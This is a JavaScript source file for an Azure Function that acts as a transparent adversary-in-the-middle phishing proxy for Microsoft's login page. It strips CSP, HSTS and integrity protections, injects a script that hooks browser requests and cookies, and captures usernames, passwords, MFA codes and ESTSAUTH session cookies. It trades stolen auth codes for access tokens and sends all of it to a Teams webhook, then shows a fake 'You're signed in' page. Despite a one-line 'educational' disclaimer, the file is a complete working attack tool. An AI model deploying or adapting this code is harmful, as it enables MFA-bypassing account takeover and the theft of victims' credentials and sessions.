/**
 * Microsoft AiTM Proxy — Transparent proxy to login.microsoftonline.com
 *
 * Proxies the entire Microsoft login flow including credential entry, 2FA,
 * and session cookie issuance. Captures credentials on POST and monitors
 * for session cookies (ESTSAUTH, ESTSAUTHPERSISTENT, SignInStateCookie).
 *
 * Uses a server-side cookie jar per victim session so cookie forwarding to
 * Microsoft does not depend on the browser at all (avoids domain, SameSite,
 * Secure, and header-serialization issues).
 *
 * Chained with the OAuth redirect landing (ms_oauth_landing.js):
 *   1. OAuth error redirect lands victim on /login
 *   3. Proxy serves real Microsoft login pages
 *   4. Credentials, 2FA, and session cookies are captured transparently
 *
 * This code is provided for educational/research purposes only.
 */

const { app } = require("@azure/functions");
const crypto = require("crypto");

const upstream = "login.microsoftonline.com";
const upstream_path = "/";
const teams_webhook_url = process.env.TEAMS_WEBHOOK_URI;

// Headers to strip from upstream responses — removes security controls
// that would interfere with the proxy
const delete_headers = [
  "content-security-policy",
  "content-security-policy-report-only",
  "clear-site-data",
  "x-frame-options",
  "referrer-policy",
  "strict-transport-security",
  "content-length",
  "content-encoding",
  "Set-Cookie",
  "transfer-encoding", // <- this sneaky mofo
];

// Track captured sessions to avoid duplicate notifications
const capturedSessions = new Set();

// Server-side cookie jar — stores all upstream cookies per victim session.
// Set a custom cookie to store the session data that needs forwarded to Microsoft
const cookieJars = new Map();
const SESSION_COOKIE_NAME = "__proxy_sid";

// Clean up expired sessions
setInterval(() => {
  const cutoff = Date.now() - 30 * 60 * 1000;
  for (const [id, session] of cookieJars) {
    if (session.lastSeen < cutoff) cookieJars.delete(id);
  }
}, 60_000);

function getOrCreateSession(request) {
  const cookies = request.headers.get("cookie") || "";
  const match = cookies.match(new RegExp(`${SESSION_COOKIE_NAME}=([^;]+)`));
  let sessionId = match ? match[1] : null;
  let isNew = false;

  if (!sessionId || !cookieJars.has(sessionId)) {
    sessionId = crypto.randomUUID();
    cookieJars.set(sessionId, { cookies: new Map(), lastSeen: Date.now() });
    isNew = true;
  } else {
    cookieJars.get(sessionId).lastSeen = Date.now();
  }

  return { sessionId, isNew };
}

function updateJar(sessionId, setCookieHeaders) {
  const session = cookieJars.get(sessionId);
  if (!session) return;

  for (const header of setCookieHeaders) {
    const nameValue = header.split(";")[0];
    const eqIndex = nameValue.indexOf("=");
    if (eqIndex < 0) continue;
    const name = nameValue.substring(0, eqIndex).trim();
    const value = nameValue.substring(eqIndex + 1);

    // Detect cookie deletion (empty value, expires in epoch, max-age=0)
    const isExpired = /expires\s*=\s*Thu,\s*01[\s-]Jan[\s-]1970/i.test(header);
    const maxAgeZero = /max-age\s*=\s*0/i.test(header);

    if (!value || isExpired || maxAgeZero) {
      session.cookies.delete(name);
    } else {
      session.cookies.set(name, value);
    }
  }
}

function getJarCookieHeader(sessionId) {
  const session = cookieJars.get(sessionId);
  if (!session || session.cookies.size === 0) return "";
  return Array.from(session.cookies.entries())
    .map(([k, v]) => `${k}=${v}`)
    .join("; ");
}

function sessionTrackingCookie(sessionId, isSecure) {
  return `${SESSION_COOKIE_NAME}=${sessionId}; path=/; HttpOnly; SameSite=Lax${isSecure ? "; Secure" : ""}`;
}

// Adaptive Card dispatch for Teams notifications
async function dispatchMessage(context, message) {
  context.log(message);
  if (!teams_webhook_url) return;

  const plainText = message
    .replace(/<br>/gi, "\n")
    .replace(/<b>/gi, "**")
    .replace(/<\/b>/gi, "**")
    .replace(/<code>/gi, "`")
    .replace(/<\/code>/gi, "`")
    .replace(/<[^>]*>/g, "");

  const payload = {
    type: "message",
    attachments: [{
      contentType: "application/vnd.microsoft.card.adaptive",
      content: {
        "$schema": "http://adaptivecards.io/schemas/adaptive-card.json",
        type: "AdaptiveCard",
        version: "1.4",
        body: [{ type: "TextBlock", text: plainText, wrap: true }],
      },
    }],
  };

  try {
    let resp = await fetch(teams_webhook_url, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });
    if (!resp.ok) {
      await fetch(teams_webhook_url, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ text: message }),
      });
    }
  } catch (err) {
    context.log(`Webhook error: ${err.message}`);
  }
}

// Response body rewriting — replaces upstream references with proxy host
function rewriteBody(text, upstreamHost, proxyOrigin) {
  let result = text;
  const proxyHost = proxyOrigin.replace(/^https?:\/\//, "");

  // Replace full URLs
  result = result.replace(
    new RegExp(`https://${escapeRegex(upstreamHost)}`, "g"),
    proxyOrigin
  );

  // Replace protocol-relative URLs
  result = result.replace(
    new RegExp(`//${escapeRegex(upstreamHost)}`, "g"),
    proxyOrigin.replace(/^https?:/, "")
  );

  // Replace unicode-escaped URLs (common in Microsoft's inline JS)
  result = result.replace(
    new RegExp(`https:\\\\u002f\\\\u002f${escapeRegex(upstreamHost)}`, "g"),
    proxyOrigin.replace(/\//g, "\\u002f").replace(":", ":")
  );

  // Replace bare hostname references in JavaScript strings
  result = result.replace(
    new RegExp(`"${escapeRegex(upstreamHost)}"`, "g"),
    `"${proxyHost}"`
  );

  // Handle URL-encoded references (common in Microsoft's $Config JSON and inline params)
  result = result.replace(
    new RegExp(escapeRegex(upstreamHost) + "%2[fF]", "g"),
    proxyHost + "%2F"
  );

  // Also handle login.microsoft.com (alternate domain)
  result = result.replace(/https:\/\/login\.microsoft\.com/g, proxyOrigin);
  result = result.replace(/\/\/login\.microsoft\.com/g, proxyOrigin.replace(/^https?:/, ""));

  // Strip Subresource Integrity (SRI) attributes — these would cause
  // browsers to reject our rewritten scripts/stylesheets
  result = result.replace(/\s+integrity="[^"]*"/g, "");
  result = result.replace(/\s+integrity='[^']*'/g, "");

  // Strip crossorigin attributes (not needed when same-origin via proxy)
  result = result.replace(/\s+crossorigin="[^"]*"/g, "");
  result = result.replace(/\s+crossorigin='[^']*'/g, "");
  result = result.replace(/\s+crossorigin(?=[\s>])/g, "");

  return result;
}

// Reverse-rewrite: proxy host back to upstream (for POST bodies sent to Microsoft)
function reverseRewriteBody(text, upstreamHost, proxyOrigin) {
  const proxyHost = proxyOrigin.replace(/^https?:\/\//, "");
  let result = text;

  // Replace proxy URLs back to upstream
  result = result.replace(new RegExp(escapeRegex(proxyOrigin), "g"), `https://${upstreamHost}`);
  result = result.replace(new RegExp(escapeRegex(proxyHost), "g"), upstreamHost);

  // URL-encoded proxy references back to upstream
  result = result.replace(
    new RegExp(escapeRegex(encodeURIComponent(proxyOrigin)), "g"),
    encodeURIComponent(`https://${upstreamHost}`)
  );
  result = result.replace(
    new RegExp(escapeRegex(proxyHost) + "%2[fF]", "g"),
    upstreamHost + "%2F"
  );

  return result;
}

function escapeRegex(str) {
  return str.replace(/[.*+?^${}()|[\]\\]/g, "\\$&");
}

// Cookie processing — rewrite domains, normalize paths (for browser copy)
function processCookies(originalCookies, upstreamHost, proxyHost, isSecure) {
  const processed = [];

  for (const cookie of originalCookies) {
    let modified = cookie;

    // Remove domain restrictions so cookies are host-only on proxy domain
    modified = modified.replace(/;\s*domain=[^;]+/gi, "");

    // Normalize path to / so cookies are sent on all proxy requests.
    modified = modified.replace(/;\s*path=[^;]+/gi, "; path=/");

    if (!/;\s*path\s*=/i.test(modified)) {
      modified += "; path=/";
    }

    if (/samesite\s*=\s*none/i.test(modified)) {
      modified = modified.replace(/;\s*samesite\s*=\s*none/gi, "; SameSite=Lax");
    }

    // Remove Secure flag on HTTP connections so browser accepts cookies
    if (!isSecure) {
      modified = modified.replace(/;\s*secure/gi, "");
    }

    processed.push(modified);
  }

  return processed;
}

// Credential extraction from POST body
function extractCredentials(body) {
  const pairs = body.split("&");
  const result = {};

  for (const pair of pairs) {
    const [key, ...valueParts] = pair.split("=");
    const value = decodeURIComponent(valueParts.join("=").replace(/\+/g, " "));

    if (key === "login" || key === "loginfmt") {
      result.username = value;
    } else if (key === "passwd") {
      result.password = value;
    } else if (key === "otc" || key === "otCode") {
      result.mfaCode = value;
    }
  }

  return result;
}

// Client-side injection script — handles dynamic URL rewriting
function getInjectionScript(proxyOrigin) {
  const isSecureProxy = proxyOrigin.startsWith("https:");
  return `
<script>
(function(){
  var P="${proxyOrigin}";
  var U="login.microsoftonline.com";
  var U2="login.microsoft.com";
  var IS=${isSecureProxy};

  function rw(u){
    if(!u||typeof u!=="string")return u;
    u=u.replace(new RegExp("https://"+U,"g"),P);
    u=u.replace(new RegExp("https://"+U2,"g"),P);
    u=u.replace(new RegExp("//"+U,"g"),P.replace(/^https?:/,""));
    u=u.replace(new RegExp("//"+U2,"g"),P.replace(/^https?:/,""));
    return u;
  }

  // Intercept document.cookie setter — Microsoft's JS sets cookies with
  // domain=.login.microsoftonline.com which the browser silently rejects
  // on the proxy domain. Strip domain so cookies are set as host-only.
  var cd=Object.getOwnPropertyDescriptor(Document.prototype,'cookie')||
         Object.getOwnPropertyDescriptor(HTMLDocument.prototype,'cookie');
  if(cd&&cd.set){
    Object.defineProperty(document,'cookie',{
      get:function(){return cd.get.call(document);},
      set:function(v){
        v=v.replace(/;\\s*domain=[^;]*/gi,'');
        v=v.replace(/;\\s*path=[^;]*/gi,'; path=/');
        if(!IS) v=v.replace(/;\\s*secure/gi,'');
        if(/samesite\\s*=\\s*none/i.test(v)){
          v=v.replace(/;\\s*samesite\\s*=\\s*none/gi,'; SameSite=Lax');
        }
        return cd.set.call(document,v);
      }
    });
  }

  // Intercept fetch
  var _fetch=window.fetch;
  window.fetch=function(url,opts){
    if(typeof url==="string")url=rw(url);
    else if(url&&url.url)url=new Request(rw(url.url),url);
    return _fetch.call(this,url,opts);
  };

  // Intercept XMLHttpRequest
  var _open=XMLHttpRequest.prototype.open;
  XMLHttpRequest.prototype.open=function(m,u){
    arguments[1]=rw(u);
    return _open.apply(this,arguments);
  };

  // Intercept location changes
  var _assign=window.location.assign;
  var _replace=window.location.replace;
  if(_assign)window.location.assign=function(u){return _assign.call(window.location,rw(u));};
  if(_replace)window.location.replace=function(u){return _replace.call(window.location,rw(u));};

  // Intercept window.open
  var _wopen=window.open;
  window.open=function(u,n,f){return _wopen.call(window,rw(u),n,f);};

  // Intercept form submissions — rewrite action URLs
  document.addEventListener("submit",function(e){
    var f=e.target;
    if(f&&f.action&&typeof f.action==="string"){
      f.action=rw(f.action);
    }
  },true);

  // Watch for dynamically added elements with src/href attributes
  var obs=new MutationObserver(function(muts){
    muts.forEach(function(m){
      m.addedNodes.forEach(function(n){
        if(n.nodeType!==1)return;
        if(n.src&&n.src.includes(U))n.src=rw(n.src);
        if(n.href&&n.href.includes(U))n.href=rw(n.href);
        if(n.action&&n.action.includes(U))n.action=rw(n.action);
        n.querySelectorAll&&n.querySelectorAll("[src],[href],[action]").forEach(function(el){
          if(el.src&&el.src.includes(U))el.src=rw(el.src);
          if(el.href&&el.href.includes(U))el.href=rw(el.href);
          if(el.action&&el.action.includes(U))el.action=rw(el.action);
        });
      });
    });
  });
  obs.observe(document.documentElement,{childList:true,subtree:true});
})();
</script>`;
}

// GET,POST /{*x} — Transparent proxy catch-all
app.http("phishing", {
  methods: ["GET", "POST"],
  authLevel: "anonymous",
  route: "/{*x}",
  handler: async (request, context) => {
    const original_url = new URL(request.url);
    const upstream_url = new URL(request.url);
    const proxyOrigin = `${original_url.protocol}//${original_url.host}`;
    const isSecure = original_url.protocol === "https:";

    // Get or create server-side session for cookie jar
    const { sessionId, isNew } = getOrCreateSession(request);
    if (isNew) {
      context.log(`New proxy session: ${sessionId}`);
    }

    // Rewrite to upstream Microsoft login
    upstream_url.host = upstream;
    upstream_url.port = 443;
    upstream_url.protocol = "https:";

    if (upstream_url.pathname === "/") {
      upstream_url.pathname = upstream_path;
    } else {
      upstream_url.pathname = upstream_path + upstream_url.pathname;
    }

    // Fix double-slash from path concatenation
    upstream_url.pathname = upstream_url.pathname.replace(/\/\//g, "/");

    context.log(`Proxying ${request.method}: ${original_url.pathname} -> ${upstream_url.href}`);

    // Intercept nativeclient redirect — this means auth completed successfully.
    // Microsoft redirects to /common/oauth2/nativeclient?code=... after login.
    // We capture the auth code and can exchange it for tokens.
    if (original_url.pathname.includes("/oauth2/nativeclient") || original_url.pathname.includes("/oauth/nativeclient")) {
      const authCode = original_url.searchParams.get("code");
      const authError = original_url.searchParams.get("error");

      if (authCode) {
        context.log("=== AUTH CODE CAPTURED ===");
        context.log("Code:", authCode);

        await dispatchMessage(context,
          `<b>AUTH CODE CAPTURED</b><br>` +
          `<b>Code:</b> <code>${authCode}</code><br>` +
          `Authentication completed successfully through proxy.`
        );

        // Exchange auth code for tokens
        try {
          const tokenResp = await fetch("https://login.microsoftonline.com/common/oauth2/v2.0/token", {
            method: "POST",
            headers: { "Content-Type": "application/x-www-form-urlencoded" },
            body: new URLSearchParams({
              client_id: "1fec8e78-bce4-4aaf-ab1b-5451cc387264",
              grant_type: "authorization_code",
              code: authCode,
              redirect_uri: "https://login.microsoftonline.com/common/oauth2/nativeclient",
              scope: "openid profile",
            }).toString(),
          });
          const tokens = await tokenResp.json();

          if (tokens.access_token) {
            context.log("=== TOKENS FROM AUTH CODE ===");
            context.log("Access Token:", tokens.access_token);
            context.log("Refresh Token:", tokens.refresh_token ? "present" : "none");

            let userInfo = "unknown";
            if (tokens.id_token) {
              try {
                const claims = JSON.parse(
                  Buffer.from(tokens.id_token.split(".")[1], "base64url").toString("utf-8")
                );
                userInfo = claims.preferred_username || claims.upn || claims.email || "unknown";
                context.log("User:", userInfo);
                context.log("Tenant:", claims.tid || "unknown");
              } catch (e) {}
            }

            await dispatchMessage(context,
              `<b>TOKENS CAPTURED (Auth Code Exchange)</b><br>` +
              `<b>User:</b> ${userInfo}<br>` +
              `<b>Access Token:</b> <code>${tokens.access_token}</code><br>` +
              `<b>Refresh Token:</b> ${tokens.refresh_token ? "present" : "none"}<br>` +
              `<b>Scopes:</b> ${tokens.scope || "N/A"}`
            );
          } else if (tokens.error) {
            context.log("Token exchange error:", tokens.error, tokens.error_description);
          }
        } catch (err) {
          context.log("Token exchange failed:", err.message);
        }
      }

      if (authError) {
        context.log("Auth error at nativeclient:", authError);
      }

      // Also log any session cookies we accumulated in the jar
      const jar = cookieJars.get(sessionId);
      if (jar) {
        const jarNames = Array.from(jar.cookies.keys());
        context.log(`Session jar at completion: [${jarNames.join(", ")}]`);

        // Log captured session cookies from the jar
        const sessionCookieNames = ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie"];
        const capturedFromJar = sessionCookieNames.filter(n => jar.cookies.has(n));
        if (capturedFromJar.length > 0) {
          const cookieValues = capturedFromJar.map(n => `${n}=${jar.cookies.get(n)}`);
          await dispatchMessage(context,
            `<b>SESSION COOKIES FROM JAR</b><br>` +
            `<b>Cookies:</b> ${capturedFromJar.join(", ")}<br><br>` +
            `<code>${cookieValues.map(c => c).join("\n")}</code>`
          );
        }
      }

      const completionHtml = `<!DOCTYPE html>
<html><head><meta charset="utf-8"><title>Sign in</title>
<style>
body{font-family:'Segoe UI',sans-serif;background:#f2f2f2;display:flex;align-items:center;justify-content:center;height:100vh;margin:0}
.card{background:#fff;padding:44px;width:440px;box-shadow:0 2px 6px rgba(0,0,0,.2);text-align:center}
.logo{width:108px;margin-bottom:16px}
h1{font-size:24px;font-weight:600;color:#1b1b1b;margin-bottom:12px}
p{color:#1b1b1b;font-size:15px;line-height:1.5}
</style></head>
<body><div class="card">
<img class="logo" src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Microsoft">
<h1>You're signed in</h1>
<p>You can close this window and return to your application.</p>
</div></body></html>`;

      return new Response(completionHtml, {
        status: 200,
        headers: { "Content-Type": "text/html; charset=utf-8" },
      });
    }

    // Credential capture on POST
    let requestBody = null;
    if (request.method === "POST") {
      const cloned = request.clone();
      requestBody = await cloned.text();

      const creds = extractCredentials(requestBody);

      if (creds.username && creds.password) {
        context.log("=== CREDENTIALS CAPTURED ===");
        context.log("Username:", creds.username);
        context.log("Password:", creds.password);
        await dispatchMessage(context,
          `<b>CREDENTIALS CAPTURED</b><br>` +
          `<b>Username:</b> ${creds.username}<br>` +
          `<b>Password:</b> ${creds.password}`
        );
      }

      if (creds.mfaCode) {
        context.log("=== MFA CODE CAPTURED ===");
        context.log("Code:", creds.mfaCode);
        await dispatchMessage(context,
          `<b>MFA CODE CAPTURED</b><br>` +
          `<b>Code:</b> ${creds.mfaCode}<br>` +
          `<b>User:</b> ${creds.username || "unknown"}`
        );
      }

      // Reverse-rewrite POST body: proxy URLs back to upstream Microsoft URLs.
      requestBody = reverseRewriteBody(requestBody, upstream, proxyOrigin);
    }

    // Build upstream request
    const new_request_headers = new Headers(request.headers);
    new_request_headers.set("Host", upstream);
    new_request_headers.set("accept-encoding", "gzip;q=0,deflate;q=0");

    // Rewrite Referer to upstream, preserving the full path.
    const clientReferer = request.headers.get("referer");
    if (clientReferer) {
      new_request_headers.set("Referer", clientReferer.replace(proxyOrigin, `https://${upstream}`));
    } else {
      new_request_headers.set("Referer", `https://${upstream}/`);
    }
    new_request_headers.set("Origin", `https://${upstream}`);

    // Use server-side cookie jar instead of browser cookies.
    const jarCookies = getJarCookieHeader(sessionId);
    if (jarCookies) {
      new_request_headers.set("Cookie", jarCookies);
      context.log(`Forwarding ${cookieJars.get(sessionId)?.cookies.size || 0} jar cookies for ${original_url.pathname}`);
    } else {
      // No jar cookies yet — forward whatever the browser sent as fallback
      context.log(`No jar cookies yet, forwarding browser cookies for ${original_url.pathname}`);
    }

    // Remove our session tracking cookie from the forwarded Cookie header
    // (Microsoft doesn't need it and shouldn't see it)
    const cookieHeader = new_request_headers.get("Cookie") || "";
    if (cookieHeader.includes(SESSION_COOKIE_NAME)) {
      const cleaned = cookieHeader
        .split(";")
        .map(c => c.trim())
        .filter(c => !c.startsWith(SESSION_COOKIE_NAME + "="))
        .join("; ");
      new_request_headers.set("Cookie", cleaned);
    }

    // Forward the browser's real User-Agent (only override if missing)
    const clientUA = request.headers.get("user-agent") || "";
    if (!clientUA) {
      new_request_headers.set("user-agent",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
      );
    }

    const fetchOpts = {
      method: request.method,
      headers: new_request_headers,
      redirect: "manual",
    };

    if (request.method === "POST") {
      fetchOpts.body = requestBody || request.body;
      fetchOpts.duplex = "half";
    }

    let original_response;
    try {
      original_response = await fetch(upstream_url.href, fetchOpts);
    } catch (err) {
      context.log(`Upstream fetch error: ${err.message}`);
      return new Response("Service temporarily unavailable", { status: 502 });
    }

    // WebSocket passthrough
    if (request.headers.get("Upgrade")?.toLowerCase() === "websocket") {
      return original_response;
    }

    // Capture upstream Set-Cookie headers into the server-side jar
    const upstreamSetCookies = original_response.headers.getSetCookie?.() || [];
    if (upstreamSetCookies.length > 0) {
      updateJar(sessionId, upstreamSetCookies);
      context.log(`Jar updated: +${upstreamSetCookies.length} cookies (${original_url.pathname}) — jar now has ${cookieJars.get(sessionId)?.cookies.size || 0} cookies`);
    }

    // Check for session cookie capture
    checkSessionCookies(upstreamSetCookies, context);

    // Handle redirects — rewrite Location header to stay on proxy
    if (original_response.status >= 300 && original_response.status < 400) {
      const location = original_response.headers.get("Location");
      if (location) {
        const rewrittenLocation = rewriteBody(location, upstream, proxyOrigin);
        context.log(`Redirect: ${location} -> ${rewrittenLocation}`);

        const redirectHeaders = new Headers();

        // Forward processed cookies to browser (for client-side JS access)
        const processedRedirectCookies = processCookies(upstreamSetCookies, upstream, original_url.host, isSecure);
        for (const c of processedRedirectCookies) {
          redirectHeaders.append("Set-Cookie", c);
        }

        // Always set session tracking cookie
        redirectHeaders.append("Set-Cookie", sessionTrackingCookie(sessionId, isSecure));

        redirectHeaders.set("Location", rewrittenLocation);
        redirectHeaders.set("Cache-Control", "no-cache, no-store, must-revalidate");

        return new Response(null, {
          status: original_response.status,
          headers: redirectHeaders,
        });
      }
    }

    // Process response headers
    const new_response_headers = new Headers(original_response.headers);
    delete_headers.forEach((h) => new_response_headers.delete(h));
    new_response_headers.set("access-control-allow-origin", "*");
    new_response_headers.set("access-control-allow-credentials", "true");

    // Forward processed cookies to browser (for client-side JS access)
    const processedCookies = processCookies(upstreamSetCookies, upstream, original_url.host, isSecure);
    for (const cookie of processedCookies) {
      new_response_headers.append("Set-Cookie", cookie);
    }

    // Always set session tracking cookie
    new_response_headers.append("Set-Cookie", sessionTrackingCookie(sessionId, isSecure));

    // Rewrite response body
    const contentType = original_response.headers.get("content-type") || "";

    // Only rewrite text-based responses
    if (contentType.includes("text/") || contentType.includes("javascript") ||
        contentType.includes("json") || contentType.includes("xml")) {

      let body = await original_response.text();
      body = rewriteBody(body, upstream, proxyOrigin);

      // Inject client-side URL rewriting script into HTML pages
      if (contentType.includes("text/html")) {
        const injectionScript = getInjectionScript(proxyOrigin);
        if (body.includes("<head>")) {
          body = body.replace("<head>", "<head>" + injectionScript);
        } else if (body.includes("<head ")) {
          body = body.replace(/<head\s[^>]*>/, "$&" + injectionScript);
        } else {
          body = injectionScript + body;
        }
      }

      return new Response(body, {
        status: original_response.status,
        headers: new_response_headers,
      });
    }

    // Binary content (images, fonts, etc.) — pass through unchanged
    return new Response(original_response.body, {
      status: original_response.status,
      headers: new_response_headers,
    });
  },
});

// Session cookie detection
function checkSessionCookies(cookies, context) {
  const sessionCookieNames = ["ESTSAUTH", "ESTSAUTHPERSISTENT", "SignInStateCookie"];
  const found = [];

  for (const cookie of cookies) {
    for (const name of sessionCookieNames) {
      if (cookie.startsWith(`${name}=`) && !cookie.includes(`${name}=;`)) {
        found.push(name);
      }
    }
  }

  if (found.length >= 2) {
    const sig = cookies.map(c => c.substring(0, 30)).join("|");
    if (capturedSessions.has(sig)) return;
    capturedSessions.add(sig);

    context.log("=== SESSION COOKIES CAPTURED ===");
    context.log("Cookies:", found.join(", "));

    const cookieValues = cookies
      .filter(c => sessionCookieNames.some(n => c.startsWith(`${n}=`)))
      .map(c => c.split(";")[0]);

    dispatchMessage(context,
      `<b>SESSION COOKIES CAPTURED</b><br>` +
      `<b>Cookies:</b> ${found.join(", ")}<br><br>` +
      `<code>${cookieValues.join("\n")}</code>`
    );
  }
}
